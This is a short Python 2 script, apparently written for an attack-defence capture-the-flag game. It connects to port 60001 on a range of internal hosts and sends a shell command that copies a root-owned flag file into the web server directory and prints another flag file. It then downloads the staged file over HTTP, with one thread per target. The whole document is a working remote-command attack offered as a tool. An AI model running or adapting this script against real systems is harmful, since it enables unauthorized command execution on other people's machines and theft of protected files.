import socket
import urllib2
import threading
def func(host):
    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((host,60001))
        s.sendall('cp -p /root/flagvalue.txt /var/www/html/ym.txt;cat /root/flag.txt')
        s.close()
        urlopen = urllib2.urlopen('http://'+host+'/ym.txt')
        print host
        print urlopen.read()
    except:
        print host
for i in range(165,167):
    host = '192.168.112.'+str(i)
    t = threading.Thread(target=func,args=(host,))
    t.start()
